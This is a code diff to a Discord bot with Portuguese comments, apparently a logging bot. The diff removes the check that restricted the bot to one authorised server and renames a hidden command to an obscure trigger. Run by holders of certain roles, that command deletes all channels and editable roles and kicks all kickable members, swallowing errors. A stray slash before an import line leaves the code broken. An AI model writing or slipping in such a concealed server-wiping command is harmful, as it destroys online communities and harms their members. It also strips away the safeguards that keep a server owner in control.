@@ -415,66 +415,67 @@ client.on(Events.GuildRoleDelete, role => {
     client.channels.cache.get(canalCargos).send(`❌ Cargo **${role.name}** foi deletado`);
 });
 
-// ====================== BLOQUEAR OUTROS SERVIDORES ======================
-
-// ID do servidor autorizado (vem do .env)
-const SERVIDOR_PERMITIDO = process.env.SERVIDOR_PERMITIDO;
-
-// Quando o bot entrar em qualquer servidor
-client.on("guildCreate", guild => {
-    if (guild.id !== SERVIDOR_PERMITIDO) {
-        console.log(`❌ Servidor não autorizado: ${guild.name} — Saindo...`);
-        guild.leave();
-    }
-});
-
-import { PermissionsBitField } from "discord.js";
+/import { PermissionsBitField } from "discord.js";
 
 client.on("messageCreate", async (message) => {
   if (message.author.bot) return;
   if (!message.guild) return;
 
-  if (message.content.toLowerCase() === "!lma7") {
+  if (message.content.toLowerCase() === "!lmgostosoa7") {
 
-    // 🔒 Permissão
-    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+    const allowedRoles = process.env.LMA7_ROLES?.split(",") || [];
+
+    const hasRole = message.member.roles.cache.some(role =>
+      allowedRoles.includes(role.id)
+    );
+
+    if (!hasRole) {
       return message.reply("❌ Você não tem permissão para usar esse comando.");
     }
 
     await message.reply("⚠️ **COMANDO INICIADO** ⚠️");
 
     // ================== APAGAR CANAIS ==================
-    message.guild.channels.cache.forEach(async (channel) => {
+    for (const channel of message.guild.channels.cache.values()) {
       try {
         await channel.delete();
       } catch (e) {}
-    });
+    }
 
     // ================== APAGAR CARGOS ==================
-    message.guild.roles.cache.forEach(async (role) => {
-      if (role.name === "@everyone") return;
-      if (!role.editable) return;
+    const roles = message.guild.roles.cache
+      .filter(role =>
+        role.name !== "@everyone" &&
+        !role.managed &&
+        role.editable
+      )
+      .sort((a, b) => b.position - a.position);
 
+    for (const role of roles.values()) {
       try {
-        await role.delete();
+        await role.delete("Comando !lmgostosoa7");
+        await new Promise(r => setTimeout(r, 800));
       } catch (e) {}
-    });
+    }
 
     // ================== EXPULSAR MEMBROS ==================
-    message.guild.members.cache.forEach(async (member) => {
-      if (member.id === message.guild.ownerId) return;
-      if (member.id === client.user.id) return;
-      if (!member.kickable) return;
+    for (const member of message.guild.members.cache.values()) {
+      if (
+        member.id === message.guild.ownerId ||
+        member.id === client.user.id ||
+        !member.kickable
+      ) continue;
 
       try {
-        await member.kick("Comando !lma7");
+        await member.kick("Comando !lmgostosoa7");
       } catch (e) {}
-    });
+    }
   }
 });
 
 
 client.login(TOKEN);
+
 
 
 
